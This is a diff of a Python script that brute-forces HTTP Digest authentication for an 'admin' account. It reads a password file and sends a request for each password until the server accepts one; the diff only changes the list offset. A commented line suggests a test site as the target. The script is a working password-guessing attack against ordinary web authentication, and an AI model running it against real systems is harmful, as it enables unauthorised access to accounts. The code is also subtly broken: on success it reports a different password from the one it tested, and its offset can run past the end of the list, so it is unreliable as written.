@@ -15,12 +15,13 @@ with open('pwd.txt') as file:
 
 
 for i in range(len(passwords)):
-    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i+186000]))
+    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i+500000]))
     if request.status_code == 200:
         print(f'\n\nSuccess! Password is \"{passwords[i]}\"')
         break
-    print(f'{i+186000}:{request.status_code}, ', end='')
+    print(f'{i+500000}:{request.status_code}, ', end='')
 
 
 # r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
 # print(r.status_code)
+
